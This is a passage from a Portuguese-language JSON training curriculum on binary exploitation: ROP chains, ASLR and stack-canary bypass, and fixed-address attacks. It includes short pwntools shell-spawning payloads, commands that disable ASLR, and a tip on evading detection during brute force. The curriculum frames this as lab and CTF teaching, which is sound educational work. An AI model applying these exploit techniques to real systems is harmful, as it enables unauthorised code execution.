                              "practicalExample": "Em um binário CTF com buffer overflow de 64 bytes (x86_64), chain: [padding] + pop_rdi_ret (0x40125e) + binsh_addr (0x601050) + system_addr (0x7ffff7a05b90) + exit_addr (0x40115a). Script pwntools: p = process('./vuln'); payload = b'A'*64 + p64(pop_rdi) + p64(binsh) + p64(system); p.sendline(payload); p.interactive().",
                              "finalVerifications": [
                                "Gadgets selecionados executam sem crash em gdb.",
                                "Argumentos são corretamente carregados em rdi antes de system().",
                                "Shell spawna com '$' prompt ou comando executado.",
                                "Chain roda remotamente sem leaks adicionais.",
                                "Exploit bypassa proteções básicas (NX via ROP).",
                                "Tempo de execução < 5s em ambiente padrão."
                              ],
                              "assessmentCriteria": [
                                "Precisão na seleção de gadgets (100% match com ROPgadget output).",
                                "Corretude da chain (execução bem-sucedida em 3/3 testes).",
                                "Eficiência (mínimo gadgets, sem overhead desnecessário).",
                                "Documentação clara de endereços e lógica.",
                                "Adaptabilidade a variações (ASLR parcial).",
                                "Segurança ética (apenas em labs/CTFs)."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86_64: Leitura de gadgets e registradores.",
                                "Debugging: Uso avançado de GDB/Pwndbg.",
                                "Programação Python: Automação com Pwntools.",
                                "Arquitetura de Sistemas: Entendimento de stack e chamadas.",
                                "CTF/Pentesting: Aplicação em competições reais."
                              ],
                              "realWorldApplication": "Desenvolvimento de exploits para pesquisa em segurança, análise de vulnerabilidades em software (ex: CVE ROP-based), e defesa contra ROP em WAF/DEP/SMEP, comum em red teaming e bug bounties éticos."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.1.3.2.3",
                            "name": "Burlar ASLR em ataques ROP",
                            "description": "Explorar vazamentos de informação ou técnicas de brute-force parcial para adivinhar endereços aleatorizados da memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Funcionamento do ASLR e Suas Limitações",
                                  "subSteps": [
                                    "Estude os princípios do ASLR: randomização de base de bibliotecas, heap e stack.",
                                    "Analise entropia típica (ex: 8 bits para bibliotecas em 32-bit, mais em 64-bit).",
                                    "Identifique versões de ASLR: full, partial e leaks comuns via format strings ou use-after-free.",
                                    "Compile um binário com ASLR ativado usando gcc -pie -fPIE.",
                                    "Use ferramentas como checksec.sh para verificar ASLR em binários alvo."
                                  ],
                                  "verification": "Explique em um relatório como o ASLR randomiza endereços e liste 3 limitações exploráveis.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação ASLR (man pages, papers como 'ASLR in the Wild'), checksec.sh, gdb"
                                  ],
                                  "tips": "Foquem em ASLR parcial em sistemas antigos ou configurações de depuração desabilitadas.",
                                  "learningObjective": "Entender mecanismos de randomização e pontos fracos para bypass.",
                                  "commonMistakes": [
                                    "Confundir ASLR com NX/DEP",
                                    "Ignorar diferenças 32/64-bit",
                                    "Assumir full entropy sem verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Explorar Vazamentos de Informação",
                                  "subSteps": [
                                    "Implemente um buffer overflow com format string para leak de endereços (ex: %p).",
                                    "Use gdb ou pwntools para simular leaks de libc base ou GOT entries.",
                                    "Extraia offsets fixos de gadgets ROP via ROPgadget ou ropper.",
                                    "Calcule deslocamentos relativos: endereço leakado - offset conhecido = base.",
                                    "Teste em um binário vulnerável com ASLR ativado, capturando leaks via netcat."
                                  ],
                                  "verification": "Capture um leak de endereço da libc e calcule a base corretamente em 3 execuções.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Pwntools Python library",
                                    "Binário vulnerável com format string bug (ex: de CTF)",
                                    "ROPgadget tool",
                                    "GDB com gef-pwndbg"
                                  ],
                                  "tips": "Use %$p para posições específicas em format strings; filtre leaks válidos por padrões (ex: 0x7f...).",
                                  "learningObjective": "Desenvolver payloads que vazem endereços randomizados para desrandomização.",
                                  "commonMistakes": [
                                    "Leaks inválidos (endereços nulos ou kernel)",
                                    "Não alinhar stack após leak",
                                    "Ignorar endianness"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Brute-Force Parcial para Endereços de Baixa Entropia",
                                  "subSteps": [
                                    "Analise entropia ASLR no seu sistema (ex: 12-16 bits via múltiplas execuções).",
                                    "Crie script pwntools para brute-force de bytes baixos de um ponteiro (ex: pop rdi; ret).",
                                    "Use multi-threading ou fork() para paralelizar tentativas (1000+ por segundo).",
                                    "Integre verificação de sucesso via sigsegv ou output específico.",
                                    "Otimize com informações parciais de leaks prévios."
                                  ],
                                  "verification": "Execute brute-force bem-sucedido em <5 minutos para um gadget em binário ASLR.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Pwntools com pwnlib.rop",
                                    "Script Python para brute-force",
                                    "Docker com ASLR ativado",
                                    "Binário com ROP chain simples"
                                  ],
                                  "tips": "Comece com 32-bit para entropia menor; limite tentativas para evitar detecção.",
                                  "learningObjective": "Aplicar brute-force viável em cenários de entropia limitada.",
                                  "commonMistakes": [
                                    "Bruteforce completo (inviável)",
                                    "Não crashar graciosamente em falhas",
                                    "Exceder timeouts de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e Executar Payload ROP Completo com Bypass ASLR",
                                  "subSteps": [
                                    "Combine leak + brute-force em um payload multi-stage.",
                                    "Construa ROP chain para shell: leak -> calc base -> gadgets relativos -> system('/bin/sh').",
                                    "Teste remotamente via socket com servidor vulnerable.",
                                    "Debug com gdbserver ou remote gdb para refinar offsets.",
                                    "Documente o payload completo em assembly/hex."
                                  ],
                                  "verification": "Obtenha shell interativo em ambiente ASLR ativado em primeira tentativa pós-leak.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Pwntools full suite",
                                    "Vulnserver ou custom C vuln app",
                                    "ROPgadget, Cyclic pattern generator",
                                    "Virtual machine isolada"
                                  ],
                                  "tips": "Use one_gadget para ROP chains eficientes; pad com nops se necessário.",
                                  "learningObjective": "Integrar técnicas de bypass em exploit funcional.",
                                  "commonMistakes": [
                                    "Offsets errados pós-leak dinâmico",
                                    "Stack misalignment",
                                    "Não limpar registradores"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e Mitigar Contra-Defesas Adicionais",
                                  "subSteps": [
                                    "Teste com Canary e NX ativados; adapte ROP para bypass parcial.",
                                    "Simule W^X com PaX/Grsecurity.",
                                    "Meça taxa de sucesso e tempo médio de bypass.",
                                    "Pesquise CFI/Control-Flow Integrity e impactos em ROP.",
                                    "Proponha defesas: ASLR full + RELRO + stack canaries."
                                  ],
                                  "verification": "Relate sucessos/falhas com múltiplas proteções e sugira mitigações.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "checksec.sh avançado",
                                    "Papers sobre ASLR bypass (ex: Black Hat talks)",
                                    "QEMU para emulação custom"
                                  ],
                                  "tips": "Sempre use labs isolados; estude exploits reais como em Exploit-DB.",
                                  "learningObjective": "Compreender limitações e evoluções de defesas de memória.",
                                  "commonMistakes": [
                                    "Testar só local sem rede",
                                    "Ignorar leaks side-channel modernos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 64-bit vulnerable a buffer overflow e format string, primeiro leak o endereço da libc via %p, calcule base (leak - offset_known), então use ROP chain com pop rdi; ret para system('/bin/sh'). Brute-force os 2 bytes baixos se leak incompleto, obtendo shell em pwntools: p = process('./vuln'); p.sendline(payload); p.interactive().",
                              "finalVerifications": [
                                "Explique ASLR e liste 3 técnicas de bypass com exemplos de código.",
                                "Implemente e demonstre leak + ROP shell em vídeo ou log.",
                                "Calcule entropia ASLR no seu sistema e tempo de brute-force.",
                                "Adapte exploit para 32-bit e 64-bit.",
                                "Identifique 2 ferramentas para ROP chain generation.",
                                "Proponha 3 mitigações e teste uma."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de leaks e cálculos de base (90% sucesso).",
                                "Eficiência do brute-force (<10min para entropia 16-bit).",
                                "Funcionalidade completa do ROP chain (shell spawn).",
                                "Documentação clara com código fonte e análise.",
                                "Compreensão de erros comuns e defesas.",
                                "Criatividade em adaptações para variações de ASLR."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Construção de payloads e gadgets.",
                                "Sistemas Operacionais: Gerenciamento de memória e randomização.",
                                "Criptografia: Entropia e brute-force probabilístico.",
                                "Redes: Exploits remotos via sockets e timeouts.",
                                "Ética em Cibersegurança: Uso responsável em labs/CTFs."
                              ],
                              "realWorldApplication": "Em pentests e CTFs (ex: pwn.college, HackTheBox), burlar ASLR permite chain ROP para RCE em serviços como web servers vulneráveis; profissionais usam para validar patches em bug bounties, sempre em ambientes autorizados."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.3",
                        "name": "Proteções e Contra-medidas Básicas",
                        "description": "Mecanismos como canários de pilha, ASLR e W^X que mitigam ataques ao controle de fluxo, e como atacantes os contornam.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.3.1",
                            "name": "Entender e detectar canários de pilha",
                            "description": "Explicar o papel dos canários na detecção de sobrescrita e simular bypass via vazamento de valores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Canários de Pilha",
                                  "subSteps": [
                                    "Estude a estrutura da pilha em funções C, identificando frame pointer, return address e variáveis locais.",
                                    "Aprenda o que é buffer overflow e como ele pode sobresscrever o return address.",
                                    "Entenda o papel do canário: um valor secreto (geralmente 8 bytes) colocado entre buffers e controle de fluxo.",
                                    "Pesquise origens: implementado pelo compilador (ex: gcc -fstack-protector).",
                                    "Analise como o canário é verificado na função de retorno."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o fluxo de uma função com canário, desenhando um diagrama da pilha.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação GCC sobre stack protector",
                                    "Exemplo de código C simples (função com buffer local)",
                                    "Ferramenta de desenho (paper ou draw.io)"
                                  ],
                                  "tips": "Visualize a pilha como uma torre: buffers na base, canário como alarme, return address no topo.",
                                  "learningObjective": "Identificar a posição e propósito do canário na pilha de uma função.",
                                  "commonMistakes": "Confundir canário com ASLR (aleatoriedade de endereços) ou DEP (não-executável)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar e Inspecionar Código com Canários",
                                  "subSteps": [
                                    "Compile um programa C com e sem proteção de canário usando gcc -fstack-protector-all.",
                                    "Use GDB para examinar a pilha em uma breakpoint na função main ou teste.",
                                    "Identifique o valor do canário na memória (padrão como 'canary' terminando em 0x00).",
                                    "Modifique o código para imprimir o frame pointer e canário via assembly inline.",
                                    "Compare dumps de memória com e sem proteção."
                                  ],
                                  "verification": "Capture screenshot do GDB mostrando o canário na pilha e anote seu valor.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB debugger",
                                    "Código fonte exemplo: buffer local + função vulnerável"
                                  ],
                                  "tips": "Use 'info registers' e 'x/20gx $rsp' no GDB para inspecionar a pilha.",
                                  "learningObjective": "Visualizar e localizar canários em binários protegidos.",
                                  "commonMistakes": "Esquecer de desabilitar ASLR com 'set disable-randomization on' no GDB."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Sobrescrita de Buffer e Detecção de Canário",
                                  "subSteps": [
                                    "Escreva um programa vulnerável com strcpy em buffer pequeno.",
                                    "Crie um exploit em Python usando pwntools ou input manual para overflow.",
                                    "Execute e observe o crash/aborção quando canário é sobrescrito (SIGABRT).",
                                    "Analise o core dump ou log para confirmar detecção de canário corrompido.",
                                    "Teste sem proteção para ver sucesso do ROP básico."
                                  ],
                                  "verification": "Registre o output de erro mostrando '*** stack smashing detected ***' e compare com versão sem proteção.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Pwntools (pip install pwntools)",
                                    "Programa C vulnerável",
                                    "Python para exploit"
                                  ],
                                  "tips": "Comece com overflow pequeno para só corromper canário, não return address.",
                                  "learningObjective": "Demonstrar como canários previnem exploits de overflow.",
                                  "commonMistakes": "Usar buffer grande demais, pulando o canário diretamente para return address."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Bypass de Canário via Vazamento de Informação",
                                  "subSteps": [
                                    "Modifique o programa para vazar o canário (ex: format string bug ou off-by-one leak).",
                                    "Capture o valor do canário via leak.",
                                    "Ajuste o exploit para incluir o canário correto antes do return address.",
                                    "Execute o bypass e verifique shell ou ROP chain.",
                                    "Discuta mitigações como canários por thread ou XOR com cookie."
                                  ],
                                  "verification": "Obtenha shell interativa após bypass e prove com 'whoami' ou id.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Código com leak intencional (printf(user_input))",
                                    "Exploit Python avançado"
                                  ],
                                  "tips": "Canários mudam por processo; rode múltiplas vezes para ver variação.",
                                  "learningObjective": "Entender vazamentos como vetor para bypass de canários.",
                                  "commonMistakes": "Não sincronizar leak com valor atual do canário (use fork ou múltiplas execuções)."
                                }
                              ],
                              "practicalExample": "Em um servidor web vulnerável (ex: CGI com strcpy), um atacante usa format string para leak do canário da pilha do handler, então envia payload com canário + ROP chain para root shell.",
                              "finalVerifications": [
                                "Explicar diagrama da pilha com canário corretamente.",
                                "Detectar sobrescrita em log de crash.",
                                "Executar bypass leak+overflow com sucesso.",
                                "Diferenciar canário de outras proteções (ASLR, NX).",
                                "Simular em GDB passo a passo.",
                                "Descrever mitigações avançadas."
                              ],
                              "assessmentCriteria": [
                                "Compreensão conceitual (diagrama preciso): 0-5 pontos",
                                "Implementação prática (compilação/GDB): 0-5 pontos",
                                "Simulação de ataque/detecção: 0-5 pontos",
                                "Bypass via leak funcional: 0-5 pontos",
                                "Análise de erros comuns: 0-5 pontos"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: manipulação de pilha.",
                                "Sistemas Operacionais: gerência de memória e signals.",
                                "Criptografia: geração randômica de canários.",
                                "Redes: exploits remotos via input de rede."
                              ],
                              "realWorldApplication": "Protege aplicações como browsers (Chrome), servidores (Apache com módulos C) e jogos contra buffer overflows remotos, forçando atacantes a leaks caros, comum em CTFs e pentests reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.3.2",
                            "name": "Analisar impacto do ASLR em explorações",
                            "description": "Comparar execuções com e sem ASLR ativado, demonstrando falhas de exploração devido à aleatoriedade de endereços.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de teste sem ASLR",
                                  "subSteps": [
                                    "Instalar ferramentas necessárias como gcc, gdb e Python no Linux (ex: Ubuntu).",
                                    "Compilar um programa C vulnerável a buffer overflow com flags -fno-stack-protector -z execstack -no-pie.",
                                    "Desabilitar ASLR usando comando setarch -R ou sysctl kernel.randomize_va_space=0.",
                                    "Verificar desabilitação com cat /proc/sys/kernel/randomize_va_space (deve ser 0).",
                                    "Executar o programa e usar gdb para inspecionar layout de memória estático."
                                  ],
                                  "verification": "Layout de memória permanece idêntico em múltiplas execuções do gdb (endereços fixos).",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Linux VM (Ubuntu)",
                                    "gcc, gdb, Python3"
                                  ],
                                  "tips": [
                                    "Use VM para isolar testes e evitar comprometer sistema host.",
                                    "Documente comandos exatos para reprodução."
                                  ],
                                  "learningObjective": "Entender configuração de ambiente controlado para simular vulnerabilidades sem proteções modernas.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR completamente, levando a resultados inconsistentes.",
                                    "Compilar com proteções padrão ativadas (PIE, stack protector)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver e validar exploit sem ASLR",
                                  "subSteps": [
                                    "Criar programa C simples com buffer overflow (ex: strcpy sem bounds check).",
                                    "Usar gdb para encontrar offsets exatos do buffer até EIP/RET.",
                                    "Craftar payload em Python com NOP sled, shellcode e endereço de retorno fixo.",
                                    "Executar exploit fora do gdb e confirmar shell interativa.",
                                    "Repetir 5x para verificar consistência."
                                  ],
                                  "verification": "Exploit succeeds 100% das vezes, spawnando shell.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Programa C vulnerável",
                                    "Python para payload generator",
                                    "gdb",
                                    "netcat para testar shell"
                                  ],
                                  "tips": [
                                    "Use pattern_create.rb (metasploit) para encontrar offsets precisos.",
                                    "Inclua shellcode padrão como /bin/sh."
                                  ],
                                  "learningObjective": "Dominar crafting de exploits ROP/buffer overflow em ambiente previsível.",
                                  "commonMistakes": [
                                    "Offset incorreto levando a segfaults.",
                                    "Shellcode mal codificado causando crash imediato."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Habilitar ASLR e retestar exploit",
                                  "subSteps": [
                                    "Reabilitar ASLR com sysctl kernel.randomize_va_space=2.",
                                    "Reiniciar processos e verificar com cat /proc/<pid>/maps (endereços variam).",
                                    "Executar o mesmo exploit múltiplas vezes (10+ runs).",
                                    "Registrar falhas (segfaults, crashes) e capturar outputs.",
                                    "Comparar saídas com execução sem ASLR."
                                  ],
                                  "verification": "Exploit falha consistentemente (>90%), sem shell spawn.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Mesmo setup anterior",
                                    "sysctl ou setarch +R"
                                  ],
                                  "tips": [
                                    "Capture strace ou gdb traces para evidenciar variações de endereço.",
                                    "Teste em fork() para múltiplas runs rápidas."
                                  ],
                                  "learningObjective": "Observar impacto imediato da randomização em exploits dependentes de endereços fixos.",
                                  "commonMistakes": [
                                    "Não reiniciar gdb/processo após habilitar ASLR.",
                                    "Confundir falha com outro bug no payload."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar randomização de endereços com ferramentas",
                                  "subSteps": [
                                    "Usar gdb com info proc mappings em múltiplas runs para comparar bibliotecas/stack/heap.",
                                    "Executar ldd no binário e objdump para inspecionar seções.",
                                    "Usar readelf -h para headers e verificar ASLR effects.",
                                    "Gráfico de endereços base via script Python plotting /proc/maps.",
                                    "Documentar variações (ex: libc base muda 0x100000 bytes)."
                                  ],
                                  "verification": "Relatório com screenshots/logs mostrando endereços randomizados.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "gdb avançado (gef/pwndbg plugins recomendados)",
                                    "Python matplotlib para plots",
                                    "readelf, objdump"
                                  ],
                                  "tips": [
                                    "Instale pwndbg para gdb mais intuitivo em exploits.",
                                    "Foquem em regiões ASLR: stack, heap, libs."
                                  ],
                                  "learningObjective": "Interpretar mapas de memória e quantificar entropia da randomização.",
                                  "commonMistakes": [
                                    "Ignorar ASLR parcial (full vs partial).",
                                    "Não diferenciar stack vs mmap randomization."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar comparação e impactos",
                                  "subSteps": [
                                    "Criar tabela comparativa: sem/com ASLR (sucesso %, endereços, ROP chain).",
                                    "Explicar como ASLR quebra ROP/DEP bypasses dependentes de leaks.",
                                    "Discutir mitigações complementares (NX, RELRO).",
                                    "Redigir relatório com evidências e conclusões.",
                                    "Apresentar findings em formato markdown ou slides."
                                  ],
                                  "verification": "Relatório completo com tabelas, screenshots e análise qualitativa/quantitativa.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Editor de texto (VSCode)",
                                    "Ferramentas de screenshot (flameshot)"
                                  ],
                                  "tips": [
                                    "Use diffs de logs para destacar mudanças.",
                                    "Inclua referências a papers como ASLR whitepaper."
                                  ],
                                  "learningObjective": "Sintetizar análise para comunicar eficácia de ASLR.",
                                  "commonMistakes": [
                                    "Análise superficial sem métricas quantitativas.",
                                    "Omitir cenários onde ASLR falha (info leaks)."
                                  ]
                                }
                              ],
                              "practicalExample": "Programa C 'vuln.c' com main() { char buf[64]; strcpy(buf, argv[1]); }. Sem ASLR: payload 'A*72 + \\xXX\\xXX\\xXX\\xXX (ret to system)' spawna shell. Com ASLR: ret address inválido, segfault em 100% runs devido a libc base randomizado.",
                              "finalVerifications": [
                                "Exploit sem ASLR succeeds consistentemente (5/5 runs).",
                                "Exploit com ASLR falha (0/10 runs).",
                                "Mapas de memória mostram variação >1MB em bases de libs/stack.",
                                "Relatório explica quebra de ROP chains.",
                                "Identifica limitações ASLR (ex: leaks via format strings)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração ASLR (verificação via sysctl/maps).",
                                "Qualidade do exploit (consistência, clean shell).",
                                "Profundidade da análise (quantitativa com endereços/logs).",
                                "Clareza do relatório comparativo (tabelas/gráficos).",
                                "Compreensão conceitual (explicação de entropia e bypasses)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly (crafting payloads).",
                                "Sistemas Operacionais (gerenciamento de memória virtual).",
                                "Estatística/Probabilidade (análise de entropia randomização).",
                                "Ética em Cibersegurança (uso responsável de exploits)."
                              ],
                              "realWorldApplication": "ASLR é padrão em OS modernos (Linux, Windows, iOS), frustrando exploits zero-day em browsers/servers; analistas usam essa skill para red teaming, bypass research e hardening de sistemas contra ROP attacks como em EternalBlue."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.2.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.4",
                    "name": "Aleatoriedade de Endereçamento de Memória (ASLR)",
                    "description": "Randomização de endereços de memória para mitigar ataques baseados em endereços fixos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.4.1",
                        "name": "Endereços de Memória Fixos e Vulnerabilidades Associadas",
                        "description": "Compreensão dos problemas causados por endereços de memória previsíveis em programas, que facilitam ataques como overflow de buffer e ROP (Return-Oriented Programming).",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.1.1",
                            "name": "Identificar endereços fixos em binários",
                            "description": "Analisar binários compilados para identificar endereços estáticos de funções, bibliotecas e pilha, utilizando ferramentas como objdump ou gdb, e explicar como isso permite exploração em ataques de controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Obter Binário de Exemplo",
                                  "subSteps": [
                                    "Instale ferramentas essenciais: objdump (parte do binutils) e gdb via apt install binutils gdb.",
                                    "Compile ou baixe um binário simples em C sem proteções (ex: sem PIE/ASLR): gcc -m32 -fno-stack-protector -z execstack -no-pie example.c -o vuln32.",
                                    "Desabilite ASLR no sistema: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                    "Verifique o binário com file vuln32 para confirmar arquitetura e ausência de proteções.",
                                    "Execute o binário para garantir que roda sem crashes."
                                  ],
                                  "verification": "Confirme instalação com objdump --version e gdb --version; rode o binário e veja endereços consistentes em múltiplas execuções.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Linux/WSL ou VM Ubuntu",
                                    "Código fonte C simples",
                                    "gcc, binutils, gdb"
                                  ],
                                  "tips": [
                                    "Use setarch -R ./vuln32 para execução isolada sem ASLR.",
                                    "Escolha binários 32-bit para simplicidade inicial."
                                  ],
                                  "learningObjective": "Configurar um ambiente reproduzível para análise de endereços fixos em binários.",
                                  "commonMistakes": [
                                    "Compilar com -pie ativado, criando endereços relativos.",
                                    "Esquecer de desabilitar ASLR globalmente.",
                                    "Usar binários de sistema com proteções modernas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Análise Estática com objdump",
                                  "subSteps": [
                                    "Execute objdump -h vuln32 para listar seções (.text, .data, .plt).",
                                    "Use objdump -t vuln32 para tabela de símbolos e identifique funções como main@0x08048400.",
                                    "Desmonte o código: objdump -d vuln32 | grep -A5 '<main>:' para ver instruções e endereços fixos.",
                                    "Procure por endereços na pilha ou heap referenciados estaticamente (ex: strings em .rodata).",
                                    "Salve saída em arquivo: objdump -d vuln32 > disasm.txt e anote 5 endereços fixos chave."
                                  ],
                                  "verification": "Liste pelo menos 3 endereços fixos de funções ou gadgets (ex: 0x08048400 para main).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binário vuln32",
                                    "objdump",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": [
                                    "Use grep '<function_name>' para filtrar símbolos.",
                                    "Foque em seções executáveis como .text."
                                  ],
                                  "learningObjective": "Extrair endereços estáticos de funções e dados usando análise estática.",
                                  "commonMistakes": [
                                    "Confundir endereços relativos com absolutos.",
                                    "Ignorar seções como .plt para chamadas de biblioteca.",
                                    "Não salvar saídas para referência posterior."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Análise Dinâmica com GDB",
                                  "subSteps": [
                                    "Inicie gdb ./vuln32 e execute info proc mappings para ver layout de memória.",
                                    "Use info functions para listar funções com endereços runtime (ex: main at 0x08048400).",
                                    "Defina breakpoint: break main; run; print &main para confirmar endereço fixo.",
                                    "Examine pilha: x/10gx $esp e note padrões fixos; use disassemble main.",
                                    "Simule input para crash e examine core dump: info registers; x/i $pc para gadgets próximos."
                                  ],
                                  "verification": "Confirme que endereços em gdb coincidem com objdump em 3+ execuções.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB",
                                    "Binário vuln32",
                                    "Inputs de teste para crash opcional"
                                  ],
                                  "tips": [
                                    "Use layout asm no gdb para visualização interativa.",
                                    " Rode com --nx para desabilitar auto-load."
                                  ],
                                  "learningObjective": "Validar endereços fixos em execução dinâmica e inspecionar memória runtime.",
                                  "commonMistakes": [
                                    "Executar com ASLR ativado, causando endereços variáveis.",
                                    "Não usar break* para pausar em funções específicas.",
                                    "Confundir registradores com endereços absolutos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar Resultados e Ligar a Vulnerabilidades de Controle de Fluxo",
                                  "subSteps": [
                                    "Compare saídas de objdump e gdb: documente endereços fixos como função targets.",
                                    "Identifique bibliotecas: ldd vuln32 e objdump -T para PLT/GOT entries fixas.",
                                    "Explique exploração: 'Endereço fixo de win() permite ROP chain em overflow sem ASLR'.",
                                    "Simule bypass: Crie script Python para calcular offsets baseados em leak parcial.",
                                    "Documente relatório: Liste endereços, riscos e mitigações (ex: habilitar full ASLR/PIE)."
                                  ],
                                  "verification": "Escreva parágrafo explicando como um endereço fixo habilita hijack de EIP em buffer overflow.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notas de steps anteriores",
                                    "Python para protótipo de exploit",
                                    "ldd"
                                  ],
                                  "tips": [
                                    "Pense em ROP: gadgets em 0x08048xxx são previsíveis sem ASLR.",
                                    "Teste consistência rodando 5x."
                                  ],
                                  "learningObjective": "Conectar identificação de endereços fixos a ataques reais como ROP e bypass ASLR.",
                                  "commonMistakes": [
                                    "Ignorar GOT/PLT para libs dinâmicas.",
                                    "Não considerar arquiteturas 64-bit com diferenças.",
                                    "Subestimar impacto de PIE em endereções relativas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um desafio CTF com binário vuln32 sem ASLR, objdump revela system@plt em 0x08048540. Em gdb, confirme após buffer overflow: EIP hijacked para 0x08048540 com input 'A'*40 + '\\x40\\x85\\04\\08'. Isso permite shell sem adivinhar endereços.",
                              "finalVerifications": [
                                "Identifique corretamente 5+ endereços fixos usando objdump e gdb.",
                                "Explique diferença entre endereços estáticos e randomizados por ASLR.",
                                "Simule um ROP gadget chain usando endereços fixos identificados.",
                                "Gere relatório documentando riscos para um binário sem proteções.",
                                "Confirme consistência de endereços em 5 execuções separadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração de endereços (100% match com ferramentas).",
                                "Profundidade da análise estática/dinâmica (cobertura de seções e runtime).",
                                "Correta ligação a ataques de controle de fluxo (ex: ROP, ret2libc).",
                                "Clareza no relatório e exemplos práticos.",
                                "Identificação de mitigações (ASLR, PIE, RELRO)."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly: Leitura de disassembly para gadgets.",
                                "Sistemas Operacionais: Gerenciamento de memória e ASLR internals.",
                                "Engenharia Reversa: Ferramentas como radare2 complementares.",
                                "Desenvolvimento de Exploits: Crafting payloads com pwntools."
                              ],
                              "realWorldApplication": "Em pentests, identificam endereços fixos em binários legados (ex: IoT devices sem ASLR) para desenvolver exploits de controle de fluxo, permitindo RCE via buffer overflows ou use-after-free, priorizando patches para full RELRO/PIE."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.2",
                            "name": "Explicar ataques baseados em endereços fixos",
                            "description": "Descrever ataques como buffer overflow e ROP que dependem de endereços conhecidos, incluindo exemplos de exploits em C/C++ e o impacto na integridade do controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de Buffer Overflow",
                                  "subSteps": [
                                    "Estude o que é um buffer e como ele é alocado na memória em programas C/C++.",
                                    "Aprenda sobre overflow: quando dados excedem o tamanho do buffer, sobrescrevendo memória adjacente.",
                                    "Identifique a pilha de execução (stack) e elementos como return address.",
                                    "Analise um diagrama da pilha mostrando buffer, variáveis locais e return address.",
                                    "Compile e execute um programa C simples com buffer vulnerável usando gdb para observar a memória."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um buffer overflow corrompe o return address, com um diagrama desenhado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Compilador GCC, debugger GDB, editor de código (VS Code), diagramas de pilha online.",
